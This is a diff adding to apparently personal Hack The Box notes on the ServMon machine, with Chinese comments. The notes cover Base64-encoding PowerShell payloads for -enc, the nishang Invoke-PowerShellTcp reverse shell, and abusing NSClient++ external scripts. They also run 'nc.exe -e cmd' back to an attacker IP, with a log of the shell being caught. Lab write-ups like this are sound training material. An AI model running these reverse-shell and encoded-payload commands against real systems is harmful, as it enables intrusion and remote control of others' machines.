@@ -1039,4 +1039,55 @@ PS C:\programdata>
 
 
 ```
+______________
+```
+$ echo 'ping -n 1 10.10.14.2' | iconv -t utf-16le
+$ echo 'ping -n 1 10.10.14.2' | iconv -t utf-16le | base64 -w 0
+//这两行命令是在把一条 Windows 命令变成 PowerShell 可用的 Base64 编码格式，常用于 HTB 里绕过限制或构造 payload
+//为什么要转 UTF-16LE？
+因为 PowerShell 的 -EncodedCommand 参数只接受 UTF-16LE 编码后的 Base64。
+//powershell -enc 的规则是：
+Base64 解码后，必须是 PowerShell要直接执行的一条命令字符串
+
+sudo tcpdump -i tun0 icmp
+Moudules && Queries : CheckExternalScripts ,Run
+
+
+cp /usr/share/nishang/Shells/Invoke-PowershellTcp .ps1
+vi ~  
+FoobatSubscribe -Reverse -IPAddress 10.10.14.27 -Port 9011
+
+
+$ cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
+> echo powshell -enc 粘贴 > evil.bat
+也可以
+> powershell -enc 粘贴
+
+nc -lvnp 9001
+
+Queries/ foobat run
+
+
+> nc.exe -e cmd 10.10.14.2 9001
+
+
+______________-
+```
+PS C:\programdata> .\nc.exe -e cmd 10.10.14.152 443
+
+$ sudo rlwrap nc -lvnp 443                                                          
+[sudo] password for parallels: 
+listening on [any] 443 ...
+connect to [10.10.14.152] from (UNKNOWN) [10.129.227.77] 50893
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\programdata>whoami
+whoami
+servmon\nadine
+
+```
+
+```
+PS C:\programdata> echo 'C:\programdata\nc.exe -e cmd 10.10.14.152 443' > evil.bat
 
